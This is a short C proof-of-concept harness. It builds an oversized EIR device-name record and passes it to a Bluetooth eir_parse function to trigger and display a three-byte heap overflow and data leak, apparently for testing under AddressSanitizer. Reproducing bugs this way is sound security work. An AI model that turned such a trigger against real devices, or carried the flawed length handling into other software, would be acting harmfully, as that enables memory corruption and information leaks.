// 253-byte name: 3-byte overflow and leak, no saved lr; build with and without asan
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "src/eir.h"

static void dump(const char *label, const char *value, size_t length)
{
	size_t i;

	printf("%s length=%zu\n%s ", label, length, label);
	for (i = 0; i < length; i++)
		printf("%02x", (unsigned char) value[i]);
	printf("\n");
}

int main(int argc, char **argv)
{
	uint8_t data[256];
	uint8_t name_len = argc > 1 ? (uint8_t) atoi(argv[1]) : 253;
	uint8_t tail = argc > 2 ? (uint8_t) strtoul(argv[2], NULL, 0) : 0x41;
	struct eir_data eir;
	size_t i;

	if (name_len < 250 || name_len > 253) {
		fprintf(stderr, "name length must be 250..253\n");
		return 2;
	}

	data[0] = name_len + 1;
	data[1] = 0x09;
	memset(data + 2, 0xff, name_len);
	data[1 + name_len] = tail;

	memset(&eir, 0, sizeof(eir));
	eir_parse(&eir, data, (uint8_t) (name_len + 2));

	if (!eir.name) {
		printf("name=NULL\n");
		return 1;
	}

	dump("name", eir.name, strlen(eir.name));
	for (i = 250; i < strlen(eir.name) && i < 260; i++)
		printf("byte[%zu]=%02x\n", i, (unsigned char) eir.name[i]);

	eir_data_free(&eir);
	return 0;
}
